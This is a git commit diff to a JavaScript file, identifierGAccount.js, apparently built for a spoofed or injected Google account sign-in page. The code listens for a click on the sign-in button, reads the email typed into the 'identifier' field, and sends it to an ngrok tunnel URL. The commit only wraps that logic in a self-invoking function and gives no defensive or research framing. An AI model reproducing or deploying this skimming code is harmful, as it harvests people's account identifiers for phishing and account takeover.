57284bbb26c91d2b5643dd253f04dd645de317aa
Wolota <123838258+Wolota@users.noreply.github.com>
2023-02-16 20:33:28 -0300

    Update identifierGAccount.js

--- identifierGAccount.js
+++ identifierGAccount.js
@@ -1,18 +1,20 @@
-const btn = document.getElementsByClassName('VfPpkd-LgbsSe');
+(function() {
+    const btn = document.getElementsByClassName('VfPpkd-LgbsSe');
 
-btn[1].addEventListener('click', function(){
-    let param = null;
-  
-    let email = document.querySelector('[name="identifier"]');
-    param = email.value;
-  
-    var xhr = new XMLHttpRequest();
-    xhr.open("GET", "https://a1e9-45-162-158-3.sa.ngrok.io/" + param, true);
-    xhr.onreadystatechange = function() {
-        if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
-            console.log(xhr.responseText);
-        }
-    };
-    xhr.send();
+    btn[1].addEventListener('click', function(){
+        let param = null;
 
-})
+        let email = document.querySelector('[name="identifier"]');
+        param = email.value;
+
+        var xhr = new XMLHttpRequest();
+        xhr.open("GET", "https://a1e9-45-162-158-3.sa.ngrok.io/" + param, true);
+        xhr.onreadystatechange = function() {
+            if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
+                console.log(xhr.responseText);
+            }
+        };
+        xhr.send();
+
+    })
+})();
